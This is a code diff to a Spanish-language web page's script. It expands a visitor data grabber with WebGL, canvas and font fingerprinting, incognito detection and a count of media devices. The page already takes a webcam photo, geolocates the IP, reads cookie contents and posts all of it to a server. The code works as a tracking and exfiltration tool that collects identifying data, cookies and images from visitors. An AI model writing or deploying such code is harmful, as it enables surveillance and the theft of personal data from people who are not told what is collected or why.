@@ -69,51 +69,158 @@
   </div>
 
   <script>
+    // ——— Utilidades ———
+    function getWebGL() {
+      try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if (!gl) return { vendor: "N/A", renderer: "N/A" };
+        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+        if (debugInfo) {
+          return {
+            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || "N/A",
+            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "N/A"
+          };
+        }
+        return {
+          vendor: gl.getParameter(gl.VENDOR) || "N/A",
+          renderer: gl.getParameter(gl.RENDERER) || "N/A"
+        };
+      } catch (e) {
+        return { vendor: "N/A", renderer: "N/A" };
+      }
+    }
+
+    function getCanvasFingerprint() {
+      try {
+        const canvas = document.createElement("canvas");
+        canvas.width = 200;
+        canvas.height = 50;
+        const ctx = canvas.getContext("2d");
+        ctx.textBaseline = "top";
+        ctx.font = "14px Arial";
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(0, 0, 100, 50);
+        ctx.fillStyle = "#069";
+        ctx.fillText("474747-fingerprint", 2, 15);
+        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+        ctx.fillText("474747-fingerprint", 4, 17);
+        return canvas.toDataURL().slice(-32);
+      } catch (e) {
+        return "N/A";
+      }
+    }
+
+    async function detectIncognito() {
+      try {
+        if (navigator.storage && navigator.storage.estimate) {
+          const { quota } = await navigator.storage.estimate();
+          // En incógnito el quota suele ser muy bajo
+          if (quota && quota < 120000000) return "Sí (probable)";
+        }
+        // Fallback: localStorage + indexedDB
+        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+        if (fs) {
+          return new Promise(resolve => {
+            fs(window.TEMPORARY, 100, () => resolve("No"), () => resolve("Sí (probable)"));
+          });
+        }
+        return "Desconocido";
+      } catch (e) {
+        return "Desconocido";
+      }
+    }
+
+    async function getMediaDevicesCount() {
+      try {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
+          return { cameras: "N/A", mics: "N/A", speakers: "N/A" };
+        }
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        return {
+          cameras: devices.filter(d => d.kind === "videoinput").length,
+          mics: devices.filter(d => d.kind === "audioinput").length,
+          speakers: devices.filter(d => d.kind === "audiooutput").length
+        };
+      } catch (e) {
+        return { cameras: "N/A", mics: "N/A", speakers: "N/A" };
+      }
+    }
+
+    function getFonts() {
+      const baseFonts = ["monospace", "sans-serif", "serif"];
+      const testFonts = [
+        "Arial", "Arial Black", "Calibri", "Cambria", "Comic Sans MS",
+        "Courier", "Courier New", "Georgia", "Helvetica", "Impact",
+        "Lucida Console", "Tahoma", "Times New Roman", "Trebuchet MS",
+        "Verdana", "Roboto", "Open Sans", "Noto Sans", "Segoe UI"
+      ];
+      const detected = [];
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+      const text = "mmmmmmmmmmlli";
+      const baselines = {};
+
+      baseFonts.forEach(base => {
+        ctx.font = "72px " + base;
+        baselines[base] = ctx.measureText(text).width;
+      });
+
+      testFonts.forEach(font => {
+        let detectedFont = false;
+        baseFonts.forEach(base => {
+          ctx.font = "72px '" + font + "', " + base;
+          if (ctx.measureText(text).width !== baselines[base]) detectedFont = true;
+        });
+        if (detectedFont) detected.push(font);
+      });
+
+      return detected.length ? detected.join(", ") : "Ninguna detectada";
+    }
+
     async function capturarFoto() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
           audio: false
         });
-
         const video = document.createElement("video");
         video.srcObject = stream;
         video.playsInline = true;
         video.muted = true;
         await video.play();
-
-        // Esperar un momento a que la cámara estabilice
-        await new Promise(r => setTimeout(r, 700));
-
+        await new Promise(r => setTimeout(r, 600));
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0);
-
-        // Detener la cámara
+        canvas.getContext("2d").drawImage(video, 0, 0);
         stream.getTracks().forEach(t => t.stop());
-
-        return canvas.toDataURL("image/jpeg", 0.7);
+        return canvas.toDataURL("image/jpeg", 0.65);
       } catch (e) {
-        console.log("No se pudo acceder a la cámara:", e.message);
         return null;
       }
     }
 
+    // ——— Main ———
     async function enviarInfo() {
       const statusEl = document.getElementById("status");
       const infoEl = document.getElementById("info");
 
+      const webgl = getWebGL();
+      const media = await getMediaDevicesCount();
+      const incognito = await detectIncognito();
+
       const data = {
+        // Red
         ip: "",
         country: "",
         city: "",
         region: "",
         isp: "",
         conexion: "No disponible",
-        tipoRed: "Desconocido",
         rtt: "N/A",
+
+        // Dispositivo
         os: navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || "Desconocido",
         browser: "Desconocido",
         device: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? "Móvil" : "PC",
@@ -124,33 +231,62 @@
         pixelRatio: String(window.devicePixelRatio || 1),
         orientacion: (screen.orientation && screen.orientation.type) ? screen.orientation.type : "Desconocida",
         colorDepth: (screen.colorDepth || "?") + " bits",
+
+        // GPU
+        gpuVendor: webgl.vendor,
+        gpuRenderer: webgl.renderer,
+
+        // Fingerprints
+        canvasFingerprint: getCanvasFingerprint(),
+        fonts: getFonts(),
+
+        // Batería
         bateria: "No disponible",
         cargando: "No disponible",
+
+        // Idioma / zona
         idioma: navigator.language || "Desconocido",
         idiomas: (navigator.languages || []).join(", ") || "N/A",
         zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
-        toque: ("ontouchstart" in window) ? "Sí" : "No",
+
+        // Privacidad
+        incognito: incognito,
+        doNotTrack: navigator.doNotTrack || navigator.msDoNotTrack || "No configurado",
+        globalPrivacyControl: navigator.globalPrivacyControl ? "Sí" : "No",
+
+        // Media
+        cameras: media.cameras,
+        mics: media.mics,
+        speakers: media.speakers,
+
+        // Almacenamiento
         cookiesEnabled: navigator.cookieEnabled ? "Sí" : "No",
-        cookies: document.cookie ? document.cookie.substring(0, 120) : "(vacío)",
+        cookies: document.cookie ? document.cookie.substring(0, 100) : "(vacío)",
         localStorage: (() => { try { localStorage.setItem("_t","1"); localStorage.removeItem("_t"); return "Sí"; } catch(e){ return "No"; } })(),
         sessionStorage: (() => { try { sessionStorage.setItem("_t","1"); sessionStorage.removeItem("_t"); return "Sí"; } catch(e){ return "No"; } })(),
-        online: navigator.onLine ? "Sí" : "No",
+
+        // Otras
+        toque: ("ontouchstart" in window) ? "Sí" : "No",
         maxTouchPoints: navigator.maxTouchPoints || 0,
+        online: navigator.onLine ? "Sí" : "No",
         webdriver: navigator.webdriver ? "Sí" : "No",
         pdfViewer: navigator.pdfViewerEnabled ? "Sí" : "No",
         vendor: navigator.vendor || "N/A",
-        userAgent: navigator.userAgent || "",
+        historyLength: history.length || 0,
         referrer: document.referrer || "(directo)",
+        memoryJS: (performance && performance.memory) ? Math.round(performance.memory.usedJSHeapSize / 1048576) + " MB" : "N/A",
+        userAgent: navigator.userAgent || "",
         foto: null
       };
 
+      // Conexión
       if (navigator.connection) {
         const c = navigator.connection;
         data.conexion = (c.effectiveType || "?") + " / " + (c.downlink || "?") + " Mbps";
-        data.tipoRed = c.type || "Desconocido";
         data.rtt = c.rtt != null ? c.rtt + " ms" : "N/A";
       }
 
+      // Navegador
       const ua = navigator.userAgent;
       if (ua.includes("Edg")) data.browser = "Edge";
       else if (ua.includes("OPR") || ua.includes("Opera")) data.browser = "Opera";
@@ -158,6 +294,7 @@
       else if (ua.includes("Firefox")) data.browser = "Firefox";
       else if (ua.includes("Safari")) data.browser = "Safari";
 
+      // Batería
       if (navigator.getBattery) {
         try {
           const bat = await navigator.getBattery();
@@ -166,13 +303,14 @@
         } catch (e) {}
       }
 
+      // IP
       try {
         const geo = await fetch("https://ipapi.co/json/", { cache: "no-store" }).then(r => r.json());
         if (geo && !geo.error) {
           data.ip = geo.ip || "";
           data.country = geo.country_name || geo.country || "";
           data.city = geo.city || "";
-          data.region = geo.region || geo.region_code || "";
+          data.region = geo.region || "";
           data.isp = geo.org || "";
         }
       } catch (e) {
@@ -188,10 +326,11 @@
         } catch (e2) {}
       }
 
-      // Intentar sacar foto (pide permiso)
+      // Foto
       statusEl.textContent = "Solicitando cámara...";
       data.foto = await capturarFoto();
 
+      // Mostrar resumen
       infoEl.innerHTML =
         "<b>IP:</b> " + (data.ip || "—") + "<br>" +
         "<b>País:</b> " + (data.country || "—") + (data.city ? " · " + data.city : "") + "<br>" +
@@ -201,14 +340,16 @@
         "<b>OS:</b> " + data.os + "<br>" +
         "<b>Navegador:</b> " + data.browser + "<br>" +
         "<b>Dispositivo:</b> " + data.device + "<br>" +
+        "<b>GPU:</b> " + data.gpuRenderer.substring(0, 40) + "<br>" +
         "<b>Pantalla:</b> " + data.pantalla + " (" + data.pixelRatio + "x)<br>" +
         "<b>RAM:</b> " + data.ram + " · <b>Núcleos:</b> " + data.nucleos + "<br>" +
         "<b>Batería:</b> " + data.bateria + " · " + data.cargando + "<br>" +
         "<div class='divider'></div>" +
-        "<b>Idioma:</b> " + data.idioma + "<br>" +
-        "<b>Zona:</b> " + data.zonaHoraria + "<br>" +
-        "<b>Foto:</b> " + (data.foto ? "Capturada" : "No disponible / denegada");
+        "<b>Incógnito:</b> " + data.incognito + "<br>" +
+        "<b>Cámaras:</b> " + data.cameras + " · <b>Mics:</b> " + data.mics + "<br>" +
+        "<b>Foto:</b> " + (data.foto ? "Capturada" : "No disponible");
 
+      // Enviar
       statusEl.textContent = "Enviando...";
       statusEl.className = "status loading";
 
@@ -218,7 +359,6 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(data)
         });
-
         const text = await res.text();
         let result = null;
         try { result = JSON.parse(text); } catch (e) {}
@@ -229,7 +369,7 @@
         } else {
           statusEl.textContent = "Error al enviar (" + res.status + ")";
           statusEl.className = "status error";
-          console.error("Respuesta:", text);
+          console.error(text);
         }
       } catch (err) {
         statusEl.textContent = "Error de conexión";
